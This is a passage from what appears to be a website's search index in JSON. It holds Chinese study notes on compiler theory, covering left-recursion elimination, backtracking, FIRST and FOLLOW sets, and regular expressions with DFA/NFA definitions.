\u65b9\u6cd5\uff1a\u9012\u5f52\u4e0b\u964d\u5206\u6790\u6cd5\u3001\u9884\u6d4b\u5206\u6790\u7a0b\u5e8f","title":"2.4.2. \u81ea\u4e0a\u800c\u4e0b(Top-down)"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#25","text":"","title":"2.5. \u81ea\u4e0a\u800c\u4e0b\u5206\u6790\u65b9\u6cd5\u7684\u95ee\u9898"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#251","text":"\u5b9a\u4e49\uff1a\u4e00\u4e2a\u6587\u6cd5\u662f\u542b\u6709\u5de6\u9012\u5f52\u7684\uff0c\u5982\u679c\u5b58\u5728\u975e\u7ec8\u7ed3\u7b26P P \\Rightarrow P \\alpha \u542b\u6709\u5de6\u9012\u5f52\u7684\u6587\u6cd5\u4f7f\u4e0a\u8ff0\u7684\u81ea\u4e0a\u800c\u4e0b\u5206\u6790\u8fc7\u7a0b\u9677\u5165\u65e0\u9650\u5faa\u73af\u3002","title":"2.5.1. \u6587\u6cd5\u5de6\u9012\u5f52\u95ee\u9898"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#252","text":"\u5b9a\u4e49\uff1a\u5206\u6790\u8fc7\u7a0b\u4e2d\uff0c\u5f53\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26\u7528\u67d0\u4e00\u4e2a\u5019\u9009\u5339\u914d\u6210\u529f\u65f6\uff0c\u8fd9\u79cd\u5339\u914d\u53ef\u80fd\u662f\u6682\u65f6\u7684\u3002\u51fa\u9519\u65f6\uff0c\u4e0d\u5f97\u4e0d\u201c \u56de\u6eaf \u201d\u3002","title":"2.5.2. \u56de\u6eaf\u95ee\u9898"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#3","text":"","title":"3. \u6d88\u9664\u6587\u6cd5\u7684\u5de6\u9012\u5f52"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#31","text":"\u5047\u5b9aP\u5173\u4e8e\u7684\u5168\u90e8\u4ea7\u751f\u5f0f\u662f P - P \\alpha_1 | P \\alpha_2 | \\cdots | P \\alpha_m | \\beta_1 | \\beta_2|\\cdots|\\beta_n (\u6bcf\u4e2a \\alpha \u90fd\u4e0d\u7b49\u4e8e \\epsilon \uff0c\u6bcf\u4e2a \\beta \u90fd\u4e0d\u4ee5 P \u5f00\u5934) \u5de6\u9012\u5f52\u53d8\u53f3\u9012\u5f52 P \\rightarrow \\beta_1 P' | \\beta_2 P' | \\cdots | \\beta_n P' P' \\rightarrow \\alpha_1 P' | \\alpha_2 P' |\\cdots | \\alpha_m P' | \\epsilon","title":"3.1. \u76f4\u63a5\u5de6\u9012\u5f52\u7684\u6d88\u9664"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#32","text":"\u95f4\u63a5\u5de6\u9012\u5f52\u5b9a\u4e49\uff1a\u7ed9\u5b9a\u6587\u6cd5 G(S) : S\\rightarrow Qc|c Q\\rightarrow Rb|b R\\rightarrow Sa|a \u867d\u7136\u4e0d\u5b58\u5728\u76f4\u63a5\u5de6\u9012\u5f52\uff0c\u4f46 S\u3001Q\u3001R \u90fd\u662f\u5de6\u9012\u5f52\u7684\uff0c\u4f8b\u5982\u6709 S \\Rightarrow Qc \\Rightarrow Rbc \\Rightarrow Sabc \u4e00\u4e2a\u6587\u6cd5\u6d88\u9664\u5de6\u9012\u5f52\u7684\u6761\u4ef6 \u4e0d\u542b\u4ee5\u03b5\u4e3a\u53f3\u90e8\u7684\u4ea7\u751f\u5f0f \u4e0d\u542b\u56de\u8def P \\Rightarrow P \u6d88\u9664\u5de6\u9012\u5f52\u7684\u7b97\u6cd5\uff1a \u628a\u6587\u6cd5G\u7684\u6240\u6709\u975e\u7ec8\u7ed3\u7b26\u6309\u4efb\u4e00\u79cd\u987a\u5e8f\u6392\u5217 P_1\uff0c P_2\uff0c\\cdots\uff0cP_n\uff1b \u6309\u6b64\u987a\u5e8f\u6267\u884c\u5982\u4e0b\u4f2a\u4ee3\u7801 FOR i:=1 TO n DO BEGIN FOR j:=1 TO i-1 DO (1) (2) END (1) \u628a\u5f62\u5982 P_i \\rightarrow P_j \\gamma \u7684\u89c4\u5219\u6539\u5199\u6210 Pi \\rightarrow \\delta_1 \\gamma | \\delta_2 \\gamma | \u2026 | \\delta_k \\gamma ; ( \u5176\u4e2d P_j \\rightarrow \\delta_1 | \\delta_2 | \\cdots | \\delta_k \u662f\u5173\u4e8e P_j \u7684\u6240\u6709\u89c4\u5219 ) (2) \u6d88\u9664\u5173\u4e8e P_i \u89c4\u5219\u7684\u76f4\u63a5\u5de6\u9012\u5f52\u6027 \u5316\u7b80\u7531 2 \u6240\u5f97\u7684\u6587\u6cd5\uff0c\u53bb\u9664\u4ece\u5f00\u59cb\u7b26\u53f7\u51fa\u53d1\u6c38\u8fdc\u65e0\u6cd5\u5230\u8fbe\u7684\u975e\u7ec8\u7ed3\u7b26\u7684\u4ea7\u751f\u89c4\u5219\u3002 \u4e3e\u4f8b\uff1a\u7ed9\u5b9a\u6587\u6cd5 G(S) \u5982\u4e0b S\\rightarrow Qc|c Q\\rightarrow Rb|b R\\rightarrow Sa|a \u5c06\u975e\u7ec8\u7ed3\u7b26\u6392\u5e8f\u4e3a R\u3001Q\u3001S \u3002\u5bf9\u4e8e R \uff0c\u4e0d\u5b58\u5728\u76f4\u63a5\u5de6\u9012\u5f52\u3002 \u628a R \u5e26\u5165\u5230 Q \u7684\u6709\u5173\u5019\u9009\u540e\uff0c\u6211\u4eec\u628a Q \u7684\u89c4\u5219\u53d8\u4e3a Q\\rightarrow Sab|ab|b \u73b0\u5728 Q \u540c\u6837\u4e0d\u5305\u542b\u76f4\u63a5\u5de6\u9012\u5f52\uff0c\u628a\u5b83\u5e26\u5165\u5230 S \u7684\u6709\u5173\u5019\u9009\u540e\uff0c S \u53d8\u6210 S \\rightarrow Sabc|abc|bc|c \u63a5\u7740\u6d88\u9664 S \u7684\u76f4\u63a5\u5de6\u9012\u5f52\uff0c\u6700\u540e\u5f97\u5230\u7684\u6587\u6cd5\u4e3a S \\rightarrow abcS'|bcS'|cS' S' \\rightarrow abcS' | \\epsilon Q\\rightarrow Sab|ab|b R\\rightarrow Sa|a \u663e\u7136\uff0c\u5176\u4e2d\u5173\u4e8e Q \u548c R \u7684\u89c4\u5219\u5df2\u7ecf\u591a\u4f59\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u5bf9\u5b83\u4eec\u8fdb\u884c\u5316\u7b80\uff0c\u6700\u540e\u5f97\u5230\u7684\u7ed3\u679c\u5982\u4e0b\u3002 S \\rightarrow abcS'|bcS'|cS' S' \\rightarrow abcS' | \\epsilon \u6ce8\u610f\uff1a\u7531\u4e8e\u5bf9\u975e\u7ec8\u7ed3\u7b26\u6392\u5e8f\u7684\u4e0d\u540c\uff0c\u6700\u540e\u6240\u5f97\u7684\u6587\u6cd5\u5728\u5f62\u5f0f\u4e0a\u53ef\u80fd\u4e0d\u4e00\u6837\u3002\u4f46\u4e0d\u96be\u8bc1\u660e\uff0c\u5b83\u4eec\u90fd\u662f\u7b49\u4ef7\u7684\u3002","title":"3.2. \u95f4\u63a5\u5de6\u9012\u5f52\u7684\u6d88\u9664"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#4","text":"\u6761\u4ef6\uff1a \u5bf9\u6587\u6cd5\u7684\u4efb\u4f55\u975e\u7ec8\u7ed3\u7b26\uff0c\u5f53\u8981\u5b83\u53bb\u5339\u914d\u8f93\u5165\u4e32\u65f6\uff0c\u80fd\u591f\u6839\u636e\u5b83\u6240\u9762\u4e34\u7684\u8f93\u5165\u7b26\u53f7\u51c6\u786e\u5730\u6307\u6d3e\u5b83\u7684\u4e00\u4e2a\u5019\u9009\u53bb\u6267\u884c\u4efb\u52a1\uff0c\u5e76\u4e14\u6b64\u5019\u9009\u7684\u5de5\u4f5c\u7ed3\u679c\u5e94\u662f\u786e\u4fe1\u65e0\u7591\u7684\u3002 \u5373\u5047\u8bbe\u73b0\u5728\u8f6e\u5230\u975e\u7ec8\u7ed3\u7b26 A \u53bb\u6267\u884c\u5339\u914d\u4efb\u52a1\uff0c A \u5171\u6709 n \u4e2a\u5019\u9009\uff0c\u5373 A \\rightarrow \\alpha_1| \\alpha_2| \\cdots | \\alpha_n A \u9762\u4e34\u4e00\u4e2a\u8f93\u5165\u7b26\u53f7 x \u65f6\uff0c\u5982\u679c\u8f93\u5165\u4e32\u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u53e5\u5b50\uff0c\u90a3\u4e48 A \u80fd\u591f\u6307\u6d3e\u67d0\u4e2a\u552f\u4e00\u786e\u5b9a\u7684\u5019\u9009 \\alpha_i \u6765\u5339\u914d x \uff0c\u82e5\u4e0d\u80fd\u5339\u914d x \uff0c\u8bf4\u660e\u8f93\u5165\u4e32\u4e0d\u662f\u5408\u6cd5\u7684\u53e5\u5b50\u3002","title":"4. \u6d88\u9664\u56de\u6eaf"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#41-first","text":"\u5b9a\u4e49\uff1a\u4ee4 G \u662f\u4e00\u4e2a\u4e0d\u542b\u5de6\u9012\u5f52\u7684\u6587\u6cd5\uff0c\u5bf9 G \u7684\u6240\u6709\u975e\u7ec8\u7ed3\u7b26\u7684\u6bcf\u4e2a\u5019\u9009 \\alpha \u5b9a\u4e49\u5b83\u7684\u7ec8\u7ed3\u9996\u7b26\u96c6 FIRST(\\alpha) \u4e3a\uff1a FIRST(\\alpha) = \\{ a| \\alpha \\Rightarrow a, \\cdots a \\in V_T \\} \u7279\u522b\u662f\uff0c\u82e5 a \\Rightarrow \\epsilon , \u5219\u89c4\u5b9a: \\epsilon \\in FIRST(\\alpha) \u6362\u53e5\u8bdd\u8bf4\uff0c FIRST(\\alpha) \u662f \\alpha \u7684\u6240\u4ee5\u53ef\u80fd\u63a8\u5bfc\u7684\u5f00\u5934\u7ec8\u7ed3\u7b26 \u6216\u53ef\u80fd\u7684 \\epsilon \u3002 \u5982\u679c\u975e\u7ec8\u7ed3\u7b26 A \u7684\u6240\u6709\u5019\u9009\u9996\u7b26\u96c6\u4e24\u4e24\u4e0d\u76f8\u4ea4\uff0c\u5373 A \u7684\u4efb\u4f55\u4e24\u4e2a\u4e0d\u540c\u5019\u9009 \\alpha_i \u548c \\alpha_j FIRST(\\alpha_i) \\bigcap FIRST(\\alpha_j) = \\varnothing \u90a3\u4e48\uff0c\u5f53\u8981\u6c42 A \u5339\u914d\u8f93\u5165\u4e32\u65f6\uff0c A \u5c31\u80fd\u6839\u636e\u5b83\u6240\u9762\u4e34\u7684\u7b2c\u4e00\u4e2a\u8f93\u5165\u7b26\u53f7 a \uff0c\u51c6\u786e\u5730\u6307\u6d3e\u67d0\u4e00\u4e2a\u5019\u9009\u524d\u53bb\u6267\u884c\u4efb\u52a1\u3002\u8fd9\u4e2a\u5019\u9009\u5c31\u662f\u90a3\u4e2a\u7ec8\u7ed3\u9996\u7b26\u96c6\u542b a \u7684 \\alpha .","title":"4.1. FIRST\u96c6\u5408"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#42","text":"\u5047\u5b9a\u5173\u4e8eA\u7684\u89c4\u5219\u662f A \\rightarrow \\delta \\beta_1 | \\delta \\beta_2 | \u2026| \\delta \\beta_n | \\gamma_1 | \\gamma_2 | \u2026 | \\gamma_m (\u5176\u4e2d\uff0c\u6bcf\u4e2a \\gamma \u4e0d\u4ee5 \\delta \u5f00\u5934) \u90a3\u4e48\uff0c\u53ef\u4ee5\u628a\u8fd9\u4e9b\u89c4\u5219\u6539\u5199\u6210 A \\rightarrow \\delta A' | \\gamma_1 | \\gamma_2 | \\cdots | \\gamma_m A' \\rightarrow \\beta_1 | \\beta_2 | \\cdots | \\beta_n \u7ecf\u8fc7\u53cd\u590d\u63d0\u53d6\u5de6\u56e0\u5b50\uff0c\u5c31\u80fd\u591f\u628a\u6bcf\u4e2a\u975e\u7ec8\u7ed3\u7b26(\u5305\u62ec\u65b0\u5f15\u8fdb\u8005)\u7684\u6240\u6709\u5019\u9009\u9996\u7b26\u96c6\u53d8\u6210\u4e3a\u4e24\u4e24\u4e0d\u76f8\u4ea4\u3002 \u5982\u679c\u7a7a\u5b57 \\epsilon \u5c5e\u4e8e\u67d0\u4e2a\u975e\u7ec8\u7ed3\u7b26\u7684\u5019\u9009\u9996\u7b26\u96c6\uff0c\u90a3\u4e48\u95ee\u9898\u5c31\u6bd4\u8f83\u590d\u6742\u3002\u5f15\u5165Follow\u96c6\u5408\u3002","title":"4.2. \u63d0\u53d6\u516c\u5171\u5de6\u56e0\u5b50"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#43-follow","text":"\u5047\u5b9a S \u662f\u6587\u6cd5 G \u7684\u5f00\u59cb\u7b26\u53f7\uff0c\u5bf9\u4e8e G \u7684\u4efb\u4f55\u975e\u7ec8\u7ed3\u7b26 A \uff0c\u6211\u4eec\u5b9a\u4e49 A \u7684FOLLOW\u96c6\u5408 FOLLOW(A) = \\{a|S \\Rightarrow ...Aa..., a \\in V_T \\} \u7279\u522b\u662f\uff0c\u82e5 S \\Rightarrow \\cdots A \u5219\u89c4\u5b9a \\# \\in FOLLOW(A) \u8868\u793a\u82e5 A \u5728\u53e5\u5b50\u7684\u672b\u5c3e\uff0c\u5219\u6807\u793a\u53e5\u5b50\u672b\u5c3e\u7684 \\# \u5728 A \u7684 Follow \u96c6\u5408\u4e2d\u3002 \u6ce8\uff1a\u90e8\u5206\u5185\u5bb9\u6574\u7406\u81ea\u56fd\u9632\u5de5\u4e1a\u51fa\u7248\u793e \u300a\u7f16\u8bd1\u539f\u7406\u300b \u6559\u6750\u548c\u4e2d\u56fd\u5927\u5b66MOOC- \u56fd\u9632\u79d1\u6280\u5927\u5b66\u300a\u7f16\u8bd1\u539f\u7406\u300b PPT","title":"4.3. FOLLOW\u96c6\u5408"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#5","text":"[1] \u9648\u706b\u65fa. \u7f16\u8bd1\u539f\u7406 [M]. \u5317\u4eac : \u56fd\u9632\u5de5\u4e1a\u51fa\u7248\u793e, 2010. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"5. \u53c2\u8003\u6587\u732e"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90-%E8%AF%8D%E6%B3%95%E8%A7%84%E5%88%99%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%8C%96/","text":"\u8bcd\u6cd5\u5206\u6790 # \u76ee\u5f55 # \u8bcd\u6cd5\u5206\u6790 \u76ee\u5f55 1. \u80cc\u666f 2. \u6b63\u89c4\u5f0f\u548c\u6b63\u89c4\u96c6 2.1. \u5b9a\u4e49 2.2. \u6b63\u89c4\u5f0f\u7684\u7b49\u4ef7\u6027 2.3. \u6b63\u89c4\u5f0f\u7684\u6027\u8d28 3. \u786e\u5b9a\u6709\u9650\u81ea\u52a8\u673a\u548c\u975e\u786e\u5b9a\u6709\u9650\u81ea\u52a8\u673a 3.1. \u786e\u5b9a\u6709\u9650\u81ea\u52a8\u673a(DFA) 3.2. \u975e\u786e\u5b9a\u6709\u9650\u81ea\u52a8\u673a(NFA) 4. \u6b63\u89c4\u5f0f\u4e0e\u6709\u9650\u81ea\u52a8\u673a\u7684\u7b49\u4ef7\u6027 4.1. \u4e3aNFA\u6784\u9020\u6b63\u89c4\u5f0f 4.2. \u4e3a\u6b63\u89c4\u5f0f\u6784\u9020NFA 5. DFA\u4e0eNFA\u7684\u7b49\u4ef7\u6027 6. NFA\u8f6c\u6362\u6210DFA 7. DFA\u7684\u5316\u7b80 8. \u53c2\u8003\u6587\u732e 1. \u80cc\u666f # \u4eca\u5929\u5b66\u4e60\u4e86\u7f16\u8bd1\u539f\u7406\u4e2d\u7684 \u8bed\u6cd5\u5206\u6790-\u81ea\u4e0a\u800c\u4e0b\u5206\u6790\u7684\u57fa\u672c\u95ee\u9898 \u8fd9\u4e00\u7ae0\u8282\uff0c\u6211\u53c2\u8003\u4e86\u56fd\u9632\u5de5\u4e1a\u51fa\u7248\u793e \u300a\u7f16\u8bd1\u539f\u7406\u300b \u6559\u6750 1 \u548c\u4e2d\u56fd\u5927\u5b66MOOC- \u56fd\u9632\u79d1\u6280\u5927\u5b66\u300a\u7f16\u8bd1\u539f\u7406\u300b \u7684PPT\uff0c\u6574\u7406\u4e86\u8fd9\u4e00\u7ae0\u7684\u5185\u5bb9\uff0c\u5e0c\u671b\u80fd\u591f\u7406\u89e3\u8fd9\u90e8\u5206\u7684\u77e5\u8bc6\u3002 2. \u6b63\u89c4\u5f0f\u548c\u6b63\u89c4\u96c6 # 2.1. \u5b9a\u4e49 # \u5bf9\u7ed9\u5b9a\u7684\u5b57\u6bcd\u8868 \\sum \\epsilon \u548c \\empty \u90fd\u662f \\sum \u4e0a\u7684\u6b63\u89c4\u5f0f\uff0c\u5b83\u4eec\u6240\u8868\u793a\u7684\u6b63\u89c4\u96c6\u4e3a \\{\\epsilon\\} \u548c \\empty ; \u4efb\u4f55 a \\in \\sum \uff0c a \u662f \\sum \u4e0a\u7684\u6b63\u89c4\u5f0f\uff0c\u5b83\u6240\u8868\u793a\u7684\u6b63\u89c4\u96c6\u4e3a \\{a\\} ; \u5047\u5b9a e_1 \u548c e_2 \u90fd\u662f \\sum \u4e0a\u7684\u6b63\u89c4\u5f0f\uff0c\u5b83\u4eec\u6240\u8868\u793a \u7684\u6b63\u89c4\u96c6\u4e3a L(e_1) \u548c L(e_2) \uff0c\u5219 (e_1|e_2) \u4e3a\u6b63\u89c4\u5f0f\uff0c\u5b83\u6240\u8868\u793a\u7684\u6b63\u89c4\u96c6\u4e3a L(e_1) \\cup L(e_2) (e_1 \\cdot e_2) \u4e3a\u6b63\u89c4\u5f0f\uff0c\u5b83\u6240\u8868\u793a\u7684\u6b63\u89c4\u96c6\u4e3a L(e_1) L(e_2) (e_1)^* \u4e3a\u6b63\u89c4\u5f0f\uff0c\u5b83\u6240\u8868\u793a\u7684\u6b63\u89c4\u96c6\u4e3a (L(e_1))^* \u4ec5\u7531\u6709\u9650\u6b21\u4f7f\u7528\u4e0a\u8ff0\u4e09\u6b65\u9aa4\u800c\u5b9a\u4e49\u7684\u8868\u8fbe\u5f0f\u624d \u662f \\sum \u4e0a\u7684\u6b63\u89c4\u5f0f\uff0c\u4ec5\u7531\u8fd9\u4e9b\u6b63\u89c4\u5f0f\u8868\u793a\u7684\u5b57 \u96c6\u624d\u662f \\sum \u4e0a\u7684\u6b63\u89c4\u96c6\u3002 2.2. \u6b63\u89c4\u5f0f\u7684\u7b49\u4ef7\u6027 # \\text{Figure 1. \u6b63\u89c4\u5f0f\u7684\u7b49\u4ef7\u6027} 2.3. \u6b63\u89c4\u5f0f\u7684\u6027\u8d28 # \\text{Figure 2. \u6b63\u89c4\u5f0f\u7684\u7b49\u4ef7\u6027} 3. \u786e\u5b9a\u6709\u9650\u81ea\u52a8\u673a\u548c\u975e\u786e\u5b9a\u6709\u9650\u81ea\u52a8\u673a # 3.1. \u786e\u5b9a\u6709\u9650\u81ea\u52a8\u673a(DFA) # \u5bf9\u72b6\u6001\u56fe\u8fdb\u884c\u5f62\u5f0f\u5316\u5b9a\u4e49 \uf075\u786e\u5b9a\u6709\u9650\u81ea\u52a8\u673a(Deterministic Finite Automata\uff0cDFA) M\u662f\u4e00\u4e2a\u4e94\u5143\u5f0f M=(S, \u03a3, f, S0, F)\uff0c\u5176\u4e2d: S: \u6709\u7a77\u72b6\u6001\u96c6 \u89c6\u9891\u533a\u57df \u03a3:\u8f93\u5165\u5b57\u6bcd\u8868(\u6709\u7a77) f: \u72b6\u6001\u8f6c\u6362\u51fd\u6570\uff0c\u4e3aS\u00d7\u03a3\u2192S\u7684\u5355\u503c\u90e8\u5206\u6620\u5c04\uff0cf(s\uff0c a)=s\u2019\u8868\u793a:\u5f53\u73b0\u884c\u72b6\u6001\u4e3as\uff0c\u8f93\u5165\u5b57\u7b26\u4e3aa\u65f6\uff0c\u5c06 \u72b6\u6001\u8f6c\u6362\u5230\u4e0b\u4e00\u72b6\u6001s\u2019\uff0cs\u2019\u79f0\u4e3as\u7684\u4e00\u4e2a\u540e\u7ee7\u72b6\u6001 S0\u2208S\u662f\u552f\u4e00\u7684\u4e00\u4e2a\u521d\u6001 F\u2286S :\u7ec8\u6001\u96c6(\u53ef\u7a7a) 3.2. \u975e\u786e\u5b9a\u6709\u9650\u81ea\u52a8\u673a(NFA) # \u5b9a\u4e49:\u4e00\u4e2a\u975e\u786e\u5b9a\u6709\u9650\u81ea\u52a8\u673a (Nondeterministic Finite Automata\uff0cNFA) M\u662f\u4e00\u4e2a\u4e94\u5143\u5f0fM=(S, \u03a3, f, S0, F)\uff0c\u5176\u4e2d: S: \u6709\u7a77\u72b6\u6001\u96c6 \u03a3 :\u8f93\u5165\u5b57\u6bcd\u8868(\u6709\u7a77) f: \u72b6\u6001\u8f6c\u6362\u51fd\u6570\uff0c\u4e3aS\u00d7\u03a3*\u21922S\u7684\u90e8\u5206\u6620\u5c04 S0\u2286S\u662f\u975e\u7a7a\u7684\u521d\u6001\u96c6 F \u2286S :\u7ec8\u6001\u96c6(\u53ef\u7a7a) 4. \u6b63\u89c4\u5f0f\u4e0e\u6709\u9650\u81ea\u52a8\u673a\u7684\u7b49\u4ef7\u6027 # 4.1. \u4e3aNFA\u6784\u9020\u6b63\u89c4\u5f0f # 4.2. \u4e3a\u6b63\u89c4\u5f0f\u6784\u9020NFA # 5. DFA\u4e0eNFA\u7684\u7b49\u4ef7\u6027 # 6. NFA\u8f6c\u6362\u6210DFA # 7. DFA\u7684\u5316\u7b80 # \u6ce8\uff1a\u90e8\u5206\u5185\u5bb9\u6574\u7406\u81ea\u56fd\u9632\u5de5\u4e1a\u51fa\u7248\u793e \u300a\u7f16\u8bd1\u539f\u7406\u300b \u6559\u6750\u548c\u4e2d\u56fd\u5927\u5b66MOOC- \u56fd\u9632\u79d1\u6280\u5927\u5b66\u300a\u7f16\u8bd1\u539f\u7406\u300b PPT 8. \u53c2\u8003\u6587\u732e # [1] \u9648\u706b\u65fa. \u7f16\u8bd1\u539f\u7406 [M]. \u5317\u4eac : \u56fd\u9632\u5de5\u4e1a\u51fa\u7248\u793e, 2010. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4.\u8bcd\u6cd5\u5206\u6790 \u8bcd\u6cd5\u89c4\u5219\u7684\u5f62\u5f0f\u5316"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90-%E8%AF%8D%E6%B3%95%E8%A7%84%E5%88%99%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%8C%96/#_1","text":"","title":"\u8bcd\u6cd5\u5206\u6790"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90-%E8%AF%8D%E6%B3%95%E8%A7%84%E5%88%99%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%8C%96/#_2","text":"\u8bcd\u6cd5\u5206\u6790 \u76ee\u5f55 1. \u80cc\u666f 2. \u6b63\u89c4\u5f0f\u548c\u6b63\u89c4\u96c6 2.1. \u5b9a\u4e49 2.2. \u6b63\u89c4\u5f0f\u7684\u7b49\u4ef7\u6027 2.3. \u6b63\u89c4\u5f0f\u7684\u6027\u8d28 3. \u786e\u5b9a\u6709\u9650\u81ea\u52a8\u673a\u548c\u975e\u786e\u5b9a\u6709\u9650\u81ea\u52a8\u673a 3.1. \u786e\u5b9a\u6709\u9650\u81ea\u52a8\u673a(DFA) 3.2. \u975e\u786e\u5b9a\u6709\u9650\u81ea\u52a8\u673a(NFA) 4. \u6b63\u89c4\u5f0f\u4e0e\u6709\u9650\u81ea\u52a8\u673a\u7684\u7b49\u4ef7\u6027 4.1. \u4e3aNFA\u6784\u9020\u6b63\u89c4\u5f0f 4.2. \u4e3a\u6b63\u89c4\u5f0f\u6784\u9020NFA 5. DFA\u4e0eNFA\u7684\u7b49\u4ef7\u6027 6. NFA\u8f6c\u6362\u6210DFA 7. DFA\u7684\u5316\u7b80 8. \u53c2\u8003\u6587\u732e","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90-%E8%AF%8D%E6%B3%95%E8%A7%84%E5%88%99%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%8C%96/#1","text":"\u4eca\u5929\u5b66\u4e60\u4e86\u7f16\u8bd1\u539f\u7406\u4e2d\u7684 \u8bed\u6cd5\u5206\u6790-\u81ea\u4e0a\u800c\u4e0b\u5206\u6790\u7684\u57fa\u672c\u95ee\u9898 \u8fd9\u4e00\u7ae0\u8282\uff0c\u6211\u53c2\u8003\u4e86\u56fd\u9632\u5de5\u4e1a\u51fa\u7248\u793e \u300a\u7f16\u8bd1\u539f\u7406\u300b \u6559\u6750 1 \u548c\u4e2d\u56fd\u5927\u5b66MOOC- 